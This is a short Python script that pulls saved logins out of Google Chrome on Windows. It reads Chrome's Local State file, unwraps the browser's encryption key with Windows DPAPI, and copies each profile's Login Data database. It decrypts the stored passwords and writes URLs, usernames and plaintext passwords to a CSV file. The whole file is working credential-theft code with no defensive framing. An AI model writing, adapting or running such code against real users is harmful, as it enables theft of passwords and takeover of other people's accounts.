import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv

LOCAL_STATE_PATH = os.path.join(os.getenv('USERPROFILE'), r'AppData\Local\Google\Chrome\User Data\Local State')
CHROME_PATH = os.path.join(os.getenv('USERPROFILE'), r'AppData\Local\Google\Chrome\User Data')

with open(LOCAL_STATE_PATH, 'r') as f:

    local_state = json.loads(f.read())

KEY = base64.b64decode(local_state['os_crypt']['encrypted_key'])

KEY = KEY[5:] 
KEY = win32crypt.CryptUnprotectData(KEY, None, None, None, 0)[1]

def decrypt_password(ciphertext):

    try:

        initialisation_vector = ciphertext[3:15]

        encrypted_password = ciphertext[15:-16]

        decrypted_pass = AES.new(KEY, AES.MODE_GCM, initialisation_vector).decrypt(encrypted_password).decode()

        return decrypted_pass

    except:

        return ciphertext

with open('Logins.csv', mode='w', newline='') as decrypt_password_file:

    csv_writer = csv.writer(decrypt_password_file, delimiter=',')

    csv_writer.writerow(['INDEX', 'URL', 'USERNAME', 'PASSWORD'])

    users = [element for element in os.listdir(CHROME_PATH) if re.search('^Profile*|^Default$',element)!=None]

    for user in users:

        LOGIN_PATH = os.path.join(CHROME_PATH, user, 'Login Data')

        shutil.copy2(LOGIN_PATH, 'Logins.db')

        conn = sqlite3.connect('Logins.db')

        if(KEY and conn):

            cursor = conn.cursor()

            cursor.execute('SELECT action_url, username_value, password_value FROM logins')

            for index, login in enumerate(cursor.fetchall()):

                url, username, ciphertext = login[0], login[1], login[2]

                if(url and username and ciphertext):

                    decrypted_password = decrypt_password(ciphertext)

                    csv_writer.writerow([index, url, username, decrypted_password])

            cursor.close()
            conn.close()

            os.remove('Logins.db')